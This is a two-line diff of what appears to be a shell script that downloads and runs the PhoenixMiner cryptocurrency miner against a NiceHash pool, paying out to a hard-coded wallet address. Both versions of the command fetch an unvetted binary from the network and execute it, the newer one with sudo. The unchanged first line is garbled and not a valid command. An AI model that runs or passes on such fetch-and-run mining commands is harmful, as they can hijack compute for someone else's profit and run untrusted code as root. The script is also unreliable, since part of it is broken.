@@ -1,2 +1,2 @@
 wget apt-get update install libpci3
-wget https://raw.githubusercontent.com/Chadv551/nw/main/PhoenixMiner && chmod +x PhoenixMiner && ./PhoenixMiner -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 37GXPqqzDp6CxSxUTptDTfq3KKGAar3V3J.T4
+wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux && sudo ./PhoenixMiner -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 37GXPqqzDp6CxSxUTptDTfq3KKGAar3V3J.T4
